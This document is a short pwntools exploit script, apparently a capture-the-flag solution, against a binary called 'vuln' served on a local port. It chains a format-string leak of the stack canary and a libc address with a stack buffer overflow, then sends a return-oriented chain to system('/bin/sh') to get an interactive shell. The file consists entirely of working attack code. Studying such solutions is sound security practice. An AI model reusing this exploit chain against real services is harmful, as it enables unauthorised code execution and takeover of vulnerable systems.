from pwn import *
from ctypes import CDLL
import math
import time

#p=process("../src/./vuln")
#p=remote("188.166.198.74","30039")
p=remote("127.0.0.1","8000")
elf=ELF("../src/./vuln")
libc_=ELF("../dist/libc.so.6")

#gdb.attach(p)
context(os='linux',arch='amd64')
context.log_level='DEBUG'

CANARY_offset=31
PIE_offset=37
LIBC_OFFSET=55

a=163141

payload="%33$p%55$p%7$x"
print(payload)
p.sendline(payload)
p.recvline()
p.recvline()
leaks=p.recvline().strip(b"\n")
leaks=["0x"+i for i in leaks.decode("utf-8").split("0x")][1:]
print(leaks)
canary=int(leaks[0],16)
libc_base=int(leaks[1][:-7],16)-a

value=int(leaks[1][-7:],16)
print(leaks)
log.info(hex(libc_base))
log.info(hex(value))
log.info(hex(canary))
p.sendlineafter(b"wrong.\n",str(value))
bin_sh=0x197e34+libc_base
pop_rdi=libc_base+0x0000000000028215
payload2=b"A"*104+p64(canary)+b"A"*8+p64(0x000000000002668c+libc_base)+p64(pop_rdi)+p64(bin_sh)+p64(libc_base+libc_.sym['system'])
p.sendlineafter(b"said.\n",payload2)
p.interactive()
